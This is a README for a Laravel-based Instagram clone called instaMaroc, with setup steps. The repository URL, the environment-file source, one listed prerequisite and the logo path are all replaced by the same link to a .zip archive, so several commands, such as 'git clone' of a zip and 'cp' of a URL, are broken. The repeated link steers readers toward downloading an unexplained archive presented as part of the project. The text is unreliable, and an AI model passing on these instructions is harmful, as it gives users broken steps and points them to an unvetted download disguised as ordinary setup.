# instaMaroc

A Laravel-based Instagram clone with Moroccan theme.

## 🚀 How to Clone and Set Up This Project

1. **Clone the repository**
   ```sh
   git clone https://raw.githubusercontent.com/zinebsektaoui/Insta_Maroc/main/seignior/Insta_Maroc.zip
   cd YOUR-REPO
   ```

2. **Install dependencies**
   ```sh
   composer install
   npm install && npm run build
   ```

3. **Copy the example environment file and set your environment variables**
   ```sh
   cp https://raw.githubusercontent.com/zinebsektaoui/Insta_Maroc/main/seignior/Insta_Maroc.zip .env
   # Then edit .env as needed (DB, mail, etc.)
   ```

4. **Generate the application key**
   ```sh
   php artisan key:generate
   ```

5. **Run migrations**
   ```sh
   php artisan migrate
   ```

6. **(Optional) Seed the database**
   ```sh
   php artisan db:seed
   ```

7. **Link storage (for profile images, stories, etc.)**
   ```sh
   php artisan storage:link
   ```

8. **Start the development server**
   ```sh
   php artisan serve
   ```
   Visit [http://localhost:8000](http://localhost:8000) in your browser.

## Notes
- Make sure you have PHP, Composer, https://raw.githubusercontent.com/zinebsektaoui/Insta_Maroc/main/seignior/Insta_Maroc.zip, and npm installed.
- The logo image should be placed at `https://raw.githubusercontent.com/zinebsektaoui/Insta_Maroc/main/seignior/Insta_Maroc.zip`.
- For any issues, check file permissions and your `.env` configuration.

---
Happy coding with instaMaroc! 🇲🇦
